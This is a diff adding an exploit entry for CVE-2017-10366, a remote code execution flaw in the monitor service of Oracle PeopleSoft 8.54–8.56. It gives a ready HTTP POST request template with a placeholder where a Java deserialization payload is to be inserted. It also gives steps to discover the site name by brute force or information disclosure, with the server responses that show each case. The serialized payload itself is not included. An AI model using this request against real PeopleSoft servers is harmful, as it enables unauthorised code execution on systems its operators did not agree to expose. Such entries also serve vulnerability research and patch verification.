@@ -1,0 +1,57 @@
+# Exploit Title: RCE vulnerability in monitor service of PeopleSoft 8.54, 8.55, 8.56
+# Date: 30 Oct 2017
+# Exploit Author: Vahagn Vardanyan
+# Vendor Homepage: Oracle
+# Software Link: Oracle PeopleSoft
+# Version: 8.54, 8.55, 8.56
+# Tested on: Windows, Linux
+# CVE : CVE-2017-10366 https://github.com/vah13/OracleCVE/tree/master/CVE-2017-10366
+
+The RCE vulnerability present in monitor service of PeopleSoft 8.54, 8.55, 8.56.
+
+POST /monitor/%SITE_NAME% HTTP/1.1
+Host: PeopleSoft:PORT
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0)
+Gecko/20100101 Firefox/51.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Cookie:a=aa
+
+§JAVA_SERIAL§
+
+%SITE_NAME% - is a PeopleSoft "name" to get it you can use some information
+disclosure or brute force. information for automation detection:
+
+   1. If monitor component deployed and you don't know %SITE_NAME% then
+   will get this type of error
+
+<h2>Site name is not valid. Check your URL syntax and try again.</h2>
+
+
+   1. If %SITE_NAME% is true then you will get this message
+
+PeopleSoft
+
+Ping Test for Monitor Servlet
+
+Ping successful. Site %SITE_NAME% is valid.
+
+
+   1. If monitor don't deployed then you will get this message
+
+Error 404--Not Found
+
+From RFC 2068 Hypertext Transfer Protocol -- HTTP/1.1:
+
+10.4.5 404 Not Found
+
+The server has not found anything matching the Request-URI. No
+indication is given of whether the condition is temporary or
+permanent.
+
+If the server does not wish to make this information available to the
+client, the status code 403 (Forbidden) can be used instead. The 410
+(Gone) status code SHOULD be used if the server knows, through some
+internally configurable mechanism, that an old resource is permanently
+unavailable and has no forwarding address.
